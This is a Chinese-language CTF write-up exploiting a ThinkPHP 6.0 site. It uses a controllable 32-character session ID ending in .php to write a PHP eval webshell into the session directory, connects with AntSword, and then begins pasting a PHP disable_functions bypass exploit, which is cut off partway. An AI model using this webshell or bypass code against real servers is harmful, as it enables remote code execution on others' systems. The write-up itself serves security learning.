#题目：

![](../Images/eb40b5bc5ed1340c37e6be0550b4350b.png)

简简单单，朴实无华的一个网站，/home/member/registerURL很有东西，MVC框架的站，看到题目，很容易就就想到是个TP的站，随后输入不存在的路由，发现是TP6.0

![](../Images/5f52b61a6675086aadcc09d5022551aa.png)

1.先用现成的POC测一下，存在一个session文件写马的漏洞，估计就是要考这个

https://www.venustech.com.cn/article/1/11027.html

session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）

然后再search搜索的内容会直接保存在/runtime/session/目录下，getshell

2.开始复现

注册界面，注册一个账号，登录的时候抓包

![](../Images/d5b54e18f02d548d4738bbcce7ab9ee2.png)

3.改包要去修改session的值，注意要修改为和正常session值一样的32位，否则无法进行存储，上面是已经修改完成的值，然后在搜索框里输入一句话木马<?php eval($\_POST\[g\]);?>，点击搜索，这时候已经将木马写入了

![](../Images/9f5494add78c49b5a0f714cec8d803fd.png)

4.不要用菜刀连接，因为🐴在里面是序列化存储的，菜刀连不上

![](../Images/d7028ae38b7d4224fb70bf09ff01d00b.png)

5.AntSword连接，发现无法执行命令，并且在根目录下发现flag文件无法读取，这里就涉及到第二个考点，查看一下禁用的命令，

![](../Images/ea51cf603bdbcf516a15b077a03bcd57.png)

6.现在需要对disable\_functions 进行bypass，github上的脚本，直接放EXP

pwn("/readflag");
function pwn($cmd) {    global $abc, $helper, $backtrace;

    class Helper {        public $a, $b, $c, $d;    }

    function ptr2str($ptr, $m = 8) {        $out = "";        for ($i=0; $i < $m; $i++) {            $out .= chr($ptr & 0xff);            $ptr >>= 8;        }        return $out;    }
    function write(&$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i < $n; $i++) {            $str[$p + $i] = chr($v & 0xff);            $v >>= 8;        }    }
    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper->a);        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }        return $leak;    }
